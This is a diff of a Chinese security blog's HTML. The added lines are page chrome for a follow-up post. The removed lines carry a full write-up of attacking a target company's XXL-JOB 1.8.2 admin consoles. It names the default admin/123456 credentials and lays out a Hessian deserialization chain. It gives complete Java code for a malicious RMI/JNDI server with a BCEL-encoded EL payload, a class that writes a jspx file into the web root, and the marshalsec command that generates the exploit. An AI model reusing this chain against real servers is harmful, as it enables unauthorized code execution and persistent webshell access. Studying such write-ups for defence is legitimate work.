@@ -6,15 +6,22 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://turn1tup.github.io">
-  <title>turn1tup&#39;s bolg</title>
+  <title>Attack_Xxl-Job-Admin-下篇 | turn1tup&#39;s bolg</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="turn1tup&#39;s bolg">
-<meta property="og:url" content="https://turn1tup.github.io/index.html">
+  <meta name="description" content="Attack_Xxl-Job-Admin-下篇在上一篇中，由于prd-server1不能外联且glue模式功能被删除，update功能也无法修改已有的Job，相关executor也无法外联，所以最终没有拿下prd-server1。在这一篇中，我们讲述一下如何拿下另外一台prd-server2。 当前信息首先，关于prd-server2有如下信息： ①通过弱口令登录了后台，后台有GLUE功能可以管理">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Attack_Xxl-Job-Admin-下篇">
+<meta property="og:url" content="https://turn1tup.github.io/2021/07/27/Attack_Xxl-Job-Admin-%E4%B8%8B%E7%AF%87/index.html">
 <meta property="og:site_name" content="turn1tup&#39;s bolg">
+<meta property="og:description" content="Attack_Xxl-Job-Admin-下篇在上一篇中，由于prd-server1不能外联且glue模式功能被删除，update功能也无法修改已有的Job，相关executor也无法外联，所以最终没有拿下prd-server1。在这一篇中，我们讲述一下如何拿下另外一台prd-server2。 当前信息首先，关于prd-server2有如下信息： ①通过弱口令登录了后台，后台有GLUE功能可以管理">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://turn1tup.github.io/2021/07/27/Attack_Xxl-Job-Admin-%E4%B8%8B%E7%AF%87/xxl-job-attack2.png">
+<meta property="og:image" content="https://turn1tup.github.io/2021/07/27/Attack_Xxl-Job-Admin-%E4%B8%8B%E7%AF%87/wireshark_rawdata.png">
+<meta property="article:published_time" content="2021-07-27T09:18:41.352Z">
+<meta property="article:modified_time" content="2021-07-27T09:18:41.352Z">
 <meta property="article:author" content="turn1tup">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://turn1tup.github.io/2021/07/27/Attack_Xxl-Job-Admin-%E4%B8%8B%E7%AF%87/xxl-job-attack2.png">
   
     <link rel="alternative" href="/atom.xml" title="turn1tup&#39;s bolg" type="application/atom+xml">
   
@@ -150,16 +157,14 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-    <article id="post-Attack_Xxl-Job-Admin-下篇" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+            <article id="post-Attack_Xxl-Job-Admin-下篇" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/27/Attack_Xxl-Job-Admin-%E4%B8%8B%E7%AF%87/">Attack_Xxl-Job-Admin-下篇</a>
+    <h1 class="article-title" itemprop="name">
+      Attack_Xxl-Job-Admin-下篇
     </h1>
   
 
@@ -228,6 +233,32 @@
       
 
       
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/assets/wechat_pay.jpg">
+                      <span class="reward-type">微信</span>
+                    </div>
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
     </div>
     <div class="article-info article-info-index">
       
@@ -235,16 +266,75 @@
       
 
       
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/07/27/Attack_Xxl-Job-Admin-%E4%B8%8B%E7%AF%87/">展开全文 >></a>
-        </p>
-      
 
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=https://turn1tup.github.io/2021/07/27/Attack_Xxl-Job-Admin-%E4%B8%8B%E7%AF%87/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
       
       <div class="clearfix"></div>
     </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+  
+    <a href="/2021/07/27/Attack_Xxl-Job-Admin1.8.2/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Attack_Xxl-Job-Admin1.8.2</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -264,1171 +354,14 @@
 
 
 
-
-  
-    <article id="post-Attack_Xxl-Job-Admin1.8.2" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/27/Attack_Xxl-Job-Admin1.8.2/">Attack_Xxl-Job-Admin1.8.2</a>
-    </h1>
-  
-
-        
-        <a href="/2021/07/27/Attack_Xxl-Job-Admin1.8.2/" class="archive-article-date">
-  	<time datetime="2021-07-27T09:13:47.632Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-27</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="Attack-Xxl-Job-Admin-1-8-2"><a href="#Attack-Xxl-Job-Admin-1-8-2" class="headerlink" title="Attack Xxl-Job Admin 1.8.2"></a>Attack Xxl-Job Admin 1.8.2</h1><p>本文记录一下遇到xxl-job1.8.2后攻击过程中做的一些研究、心得。</p>
-<p>在目标公司的资产扫描中，发现xxl-job-admin(web控制台) ，共stg-server、prd-server-1、prd-server2 三个目标。其中stg为测试网段，attacker网络互通，这为我们通过RMI进行RCE提供了便利，而prd环境无法外联。</p>
-<p>在攻击过程中经过一番测试，进行回显信息对比、代码逻辑查看，可以确定stg-server、prd-server-1版本为1.8.2，prd-server2版本为1.9.2或2.0.2。在两台1.8.2机器上，我们均没有发现弱口令。</p>
-<h2 id="XXL-JOB简介"><a href="#XXL-JOB简介" class="headerlink" title="XXL-JOB简介"></a>XXL-JOB简介</h2><p><code>https://github.com/xuxueli/xxl-job/tree/v1.8.2</code></p>
-<p>xxl-job是一款用JAVA编写的分布式定时任务管理工具，提供了<code>admin-console</code>web控制端与<code>executor</code>执行器客户端，因此我们需要在各机器上部署<code>Executor</code>客户端，随后通过控制台下发自定义的任务。</p>
-<p><img src="/2021/07/27/Attack_Xxl-Job-Admin1.8.2/xxljob.png" alt="github_xxljob"></p>
-<p>在web控制台我们通过新增<code>GLUE</code>模式的任务，在对应的<code>executor</code>上可以执行任意代码。</p>
-<p><img src="/2021/07/27/Attack_Xxl-Job-Admin1.8.2/admin-console.png" alt></p>
-<p>控制台口令是硬编码，默认为<code>admin/123456</code>；控制台的<code>/API</code>接口的<code>RcpRequest</code>调用与执行器调用都需要一个token，而该token默认为空，一般开发者不会设置，这也造成了执行器未授权访问RCE：</p>
-<p><img src="/2021/07/27/Attack_Xxl-Job-Admin1.8.2/xxl-job-admin-properties.png" alt></p>
-<p>web控制台<code>/Api</code>接口中，对用户POST的数据进行Hessian反序列化，反序列化后得到<code>RpcRequest</code>对象，进行相关服务调用。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.xxl.job.admin.controller.JobApiController</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/07/27/Attack_Xxl-Job-Admin1.8.2/JobApiController1.8.2.png" alt></p>
-<h2 id="公开EXP"><a href="#公开EXP" class="headerlink" title="公开EXP"></a>公开EXP</h2><p>首先当然是希望站在前人的肩膀上，利用现有EXP直接拿下目标，通过谷歌搜索，我们可以发现github上关于xxl-job已有如下漏洞利用工具：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;OneSourceCat&#x2F;XxlJob-Hessian-RCE&#x2F;blob&#x2F;main&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;example&#x2F;App.java</span><br></pre></td></tr></table></figure>
-
-<p>该工具是其实就是利用未授权访问下的<code>executor</code>(默认空Token)的glue代码执行功能，直接通过<code>glue java</code>进行任意代码执行。</p>
-<p>另外注意到该工具使用的序列化方法是Hessian2 <code>com.xxl.rpc.serialize.impl.HessianSerializer#HessianSerializer</code>—&gt;<code>com.caucho.hessian.io.Hessian2Output#Hessian2Output(java.io.OutputStream)</code>，而1.8.2版本是Hessian 1，当然如果能利用，这点改改就好。</p>
-<p><img src="/2021/07/27/Attack_Xxl-Job-Admin1.8.2/github_xxljob.png" alt></p>
-<p>但控制台在启动时候，实例化的<code>xxlJobDynamicScheduler</code> bean中，只放入了<code>AdminBiz</code>，没有放入<code>ExecutorBiz</code>，所以我们无法像利用<code>excutor</code>未授权访问RCE一样来攻击控制台。</p>
-<p><code>spring/applicationcontext-xxl-job-admin.xml:64</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean id&#x3D;&quot;xxlJobDynamicScheduler&quot; class&#x3D;&quot;com.xxl.job.admin.core.schedule.XxlJobDynamicScheduler&quot; init-method&#x3D;&quot;init&quot; destroy-method&#x3D;&quot;destroy&quot; &gt;</span><br><span class="line">		&lt;!-- (轻易不要变更“调度器名称”, 任务创建时会绑定该“调度器名称”) --&gt;</span><br><span class="line">		&lt;property name&#x3D;&quot;scheduler&quot; ref&#x3D;&quot;quartzScheduler&quot;&#x2F;&gt;</span><br><span class="line">		&lt;property name&#x3D;&quot;accessToken&quot; value&#x3D;&quot;$&#123;xxl.job.accessToken&#125;&quot; &#x2F;&gt;</span><br><span class="line">	&lt;&#x2F;bean&gt;</span><br></pre></td></tr></table></figure>
-
-<p><code>com.xxl.job.admin.core.schedule.XxlJobDynamicScheduler#init</code></p>
-<p><img src="/2021/07/27/Attack_Xxl-Job-Admin1.8.2/XxlJobDynamicScheduler_init.png" alt></p>
-<p><code>com.xxl.job.core.rpc.netcom.NetComServerFactory#putService</code></p>
-<p><code>com.xxl.job.core.rpc.netcom.NetComServerFactory#invokeService</code></p>
-<p><img src="/2021/07/27/Attack_Xxl-Job-Admin1.8.2/NetComServerFactory.png" alt></p>
-<p>到这里，通过前面的简介与公开POC的探究，我们目前可以得到xxl-job控制台的攻击点：</p>
-<p>①通过硬编码的弱口令登录后台，不过只能在执行器上执行命令，无法控制控制台；</p>
-<p>②通过Hessian反序列化攻击控制台，麻烦的是目前gadeget都是RMI形式，需要服务器能外联；</p>
-<p>③寻找<code>RpcRequest</code>利用点，通过未授权调用，进行利用。</p>
-<p>关于③，我们经过代码阅读，并没有发现<code>AdminBiz</code>有价值的利用点，所以这条路就放弃了。最后利用Hessian反序列化拿下了stg-server服务器；虽然我们在拿到stg-server后通过查看xx-job-admin源码，拿到了硬编码的登录密钥，并成功登录prd-server-1，但prd-server-1的<code>glue</code>模式被阉割调了，且prd-server-1与它相关的excutor均无法外联，所以我们最终没有拿下prd-server-1。不过，prd-server-2虽然也无法外联，但其<code>glue</code>模式没有被阉割，最终我们拿下了prd-server-2，关于如何拿下prd-server-2，笔者会在下篇文章讲述这个牛与牛奶的故事。</p>
-<h2 id="Hessian反序列化"><a href="#Hessian反序列化" class="headerlink" title="Hessian反序列化"></a>Hessian反序列化</h2><p>浏览<code>marshalsec</code>的代码，通过<code>HessianBase</code>实现的接口可以了解到，该关于<code>Hessian</code>反序列化可利用的gadget共有如下5个：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SpringPartiallyComparableAdvisorHolder :org.springframework.aop.aspectj.annotation.BeanFactoryAspectInstanceFactory</span><br><span class="line">SpringAbstractBeanFactoryPointcutAdvisor : org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor</span><br><span class="line">Rome : com.rometools.rome.feed.impl.ToStringBean</span><br><span class="line">XBean :org.apache.xbean.naming.context.WritableContext</span><br><span class="line">Resin :com.caucho.naming.QName</span><br></pre></td></tr></table></figure>
-
-<p>关于xxl-job能利用的有Spring的两个，而且由于在JNDI解析过程中，传入的<code>requiredType</code>不为<code>null</code>，即做了限制，该情况下无法直接利用LDAP远程加载任意类。另外测试服务器不支持<code>untrust</code>情况下的RMI，所以我们也无法直接利用RMI加载任意类。<code>org.springframework.jndi.JndiTemplate#lookup(java.lang.String, java.lang.Class&lt;T&gt;)</code></p>
-<p><img src="/2021/07/27/Attack_Xxl-Job-Admin1.8.2/JndiTemplate_lookup.png" alt></p>
-<h2 id><a href="#" class="headerlink" title></a></h2><h2 id="RMI-加载BCEL"><a href="#RMI-加载BCEL" class="headerlink" title="RMI 加载BCEL"></a>RMI 加载BCEL</h2><p>由于LDAP利用不了，参考这篇老外的翻译文章<code>https://xz.aliyun.com/t/3787</code>可知，在RMI限制利用情况下，我们依然可以通过EL表达式这条路径来执行命令。但为了便捷与持久化，且尽量不触发RASP(open-rasp对反序列化中进行命令执行检测得十分严格，在环境确定的情况下避免执行命令)，这里将代码修改为BCEL加载任意类，方便我们执行JAVA代码。</p>
-<p>这里整简单点，直接在目标机器上写jspx 。</p>
-<h3 id="JndiServer代码"><a href="#JndiServer代码" class="headerlink" title="JndiServer代码"></a>JndiServer代码</h3><p>这里的RMI服务器比较危险，而且与服务器不是在一个TCP会话中完成交互的，这里仅作demo，下篇中使用marshalsec。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.*;</span><br><span class="line"><span class="keyword">import</span> com.needle.SpringControllerNeedle;</span><br><span class="line"><span class="keyword">import</span> com.needle.TomcatWriteJsp;</span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.*;</span><br><span class="line"><span class="keyword">import</span> javax.naming.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * reference https://xz.aliyun.com/t/3787</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JndiServer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Creating evil RMI registry on port 1097"</span>);</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1097</span>);</span><br><span class="line">        <span class="comment">//prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory</span></span><br><span class="line">        ResourceRef ref = <span class="keyword">new</span> ResourceRef(<span class="string">"javax.el.ELProcessor"</span>, <span class="keyword">null</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="keyword">true</span>,<span class="string">"org.apache.naming.factory.BeanFactory"</span>,<span class="keyword">null</span>);</span><br><span class="line">        <span class="comment">//redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">"forceString"</span>, <span class="string">"x=eval"</span>));</span><br><span class="line">        <span class="comment">//expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows</span></span><br><span class="line"><span class="comment">//        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance()" +</span></span><br><span class="line"><span class="comment">//                ".getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])']" +</span></span><br><span class="line"><span class="comment">//                "(['/bin/sh','-c','nslookup jndi.s.artsploit.com']).start()\")"));</span></span><br><span class="line">        String el = getEl();</span><br><span class="line">        System.out.println(el);</span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">"x"</span>, getEl()));</span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> com.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(<span class="string">"Object"</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">getEl</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">//Tomcat 写 jsp webshell</span></span><br><span class="line">        <span class="keyword">byte</span>[] needleData = Repository.lookupClass(TomcatWriteJsp<span class="class">.<span class="keyword">class</span>).<span class="title">getBytes</span>()</span>;</span><br><span class="line">        <span class="comment">//Spring 写 controller 内存马</span></span><br><span class="line">        <span class="comment">//byte[] needleData = Repository.lookupClass(SpringControllerNeedle.class).getBytes();</span></span><br><span class="line">        String code = <span class="string">"$$BCEL$$"</span>+ Utility.encode(needleData,<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">"''.getClass().forName('%s"</span> +</span><br><span class="line">                <span class="string">"',true,''.getClass().forName('com.sun.org.apache.bcel.internal.util.ClassLoader').newInstance())"</span>,code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="TomcatWriteJsp代码"><a href="#TomcatWriteJsp代码" class="headerlink" title="TomcatWriteJsp代码"></a>TomcatWriteJsp代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.needle;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TomcatWriteJsp</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        String data = <span class="string">"&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n"</span> +</span><br><span class="line">                <span class="string">"&lt;jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\"\n"</span> +</span><br><span class="line">                <span class="string">"  version=\"1.2\"&gt;\n"</span> +</span><br><span class="line">                <span class="string">"&lt;jsp:directive.page contentType=\"text/html\"/&gt;\n"</span> +</span><br><span class="line">                <span class="string">"&lt;jsp:declaration&gt;\n"</span> +</span><br><span class="line">                <span class="string">"&lt;/jsp:declaration&gt;\n"</span> +</span><br><span class="line">                <span class="string">"&lt;jsp:scriptlet&gt;\n"</span> +</span><br><span class="line">                <span class="string">"out.write(\"I'm turn1tup!\");\n"</span> +</span><br><span class="line">                <span class="string">"&lt;/jsp:scriptlet&gt;\n"</span> +</span><br><span class="line">                <span class="string">"&lt;jsp:text&gt;\n"</span> +</span><br><span class="line">                <span class="string">"&lt;/jsp:text&gt;\n"</span> +</span><br><span class="line">                <span class="string">"&lt;/jsp:root&gt;"</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Field f = Thread.currentThread().getClass().getSuperclass().getDeclaredField(<span class="string">"threadLocals"</span>);</span><br><span class="line">            f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            Object obj = f.get(Thread.currentThread());</span><br><span class="line">            f = obj.getClass().getDeclaredField(<span class="string">"table"</span>);</span><br><span class="line">            f.setAccessible(<span class="keyword">true</span>);<span class="comment">//org.apache.catalina.connector.RequestFacade@</span></span><br><span class="line">            obj = f.get(obj);</span><br><span class="line">            Object[] obj_arr = (Object[]) obj;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; obj_arr.length; i++) &#123;</span><br><span class="line">                Object o = obj_arr[i];</span><br><span class="line">                <span class="keyword">if</span> (o == <span class="keyword">null</span>) <span class="keyword">continue</span>;</span><br><span class="line">                f = o.getClass().getDeclaredField(<span class="string">"value"</span>);</span><br><span class="line">                f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                Object att = f.get(o);</span><br><span class="line">                <span class="keyword">if</span> (att != <span class="keyword">null</span> &amp;&amp; att.getClass().getName().equals(<span class="string">"org.springframework.web.context.request"</span> +</span><br><span class="line">                        <span class="string">".ServletRequestAttributes"</span>)) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Method getReq = att.getClass().getDeclaredMethod(<span class="string">"getRequest"</span>, <span class="keyword">null</span>);</span><br><span class="line">                        Object req = getReq.invoke(att, <span class="keyword">null</span>);</span><br><span class="line">                        Method getRealPath = req.getClass().getDeclaredMethod(<span class="string">"getRealPath"</span>, String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">                        String realPath = (String) getRealPath.invoke(req, <span class="string">""</span>);</span><br><span class="line">                        String path = realPath + <span class="string">"/foo.jspx"</span>;</span><br><span class="line">                        File file = <span class="keyword">new</span> File(path);</span><br><span class="line">                        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(file);</span><br><span class="line">                        fos.write(data.getBytes());</span><br><span class="line">                        fos.flush();</span><br><span class="line">                        fos.close();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><p>开启我们的<code>JndiServer</code>，监听1097端口</p>
-<p>通过marshalsec生成<code>hessian</code>POC，并通过<code>burpsuit</code>的<code>Paste from file</code>功能将该二进制文件拷贝到<code>Request</code>的Body中：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Hessian SpringAbstractBeanFactoryPointcutAdvisor rmi:&#x2F;&#x2F;127.0.0.1:1097&#x2F;Object &gt; marshalsec.hessian.bin</span><br></pre></td></tr></table></figure>
-
-<p>发送我们的EXP即可成功在当前应用目录下写入webshell</p>
-<p><img src="/2021/07/27/Attack_Xxl-Job-Admin1.8.2/send_exploit.png" alt></p>
-<p>Reference:</p>
-<p><a href="https://github.com/OneSourceCat/XxlJob-Hessian-RCE" target="_blank" rel="noopener">https://github.com/OneSourceCat/XxlJob-Hessian-RCE</a></p>
-<p><a href="https://www.mi1k7ea.com/2021/04/22/XXL-JOB-Hessian2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://www.mi1k7ea.com/2021/04/22/XXL-JOB-Hessian2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p>
-<p><a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">https://github.com/mbechler/marshalsec</a></p>
-<p><a href="https://xz.aliyun.com/t/3787" target="_blank" rel="noopener">https://xz.aliyun.com/t/3787</a></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/07/27/Attack_Xxl-Job-Admin1.8.2/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-word宏邮件钓鱼-远程加载模板" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/06/16/word%E5%AE%8F%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC-%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E6%A8%A1%E6%9D%BF/">word宏邮件钓鱼-远程加载模板</a>
-    </h1>
-  
-
-        
-        <a href="/2021/06/16/word%E5%AE%8F%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC-%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E6%A8%A1%E6%9D%BF/" class="archive-article-date">
-  	<time datetime="2021-06-17T03:23:06.426Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-06-16</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
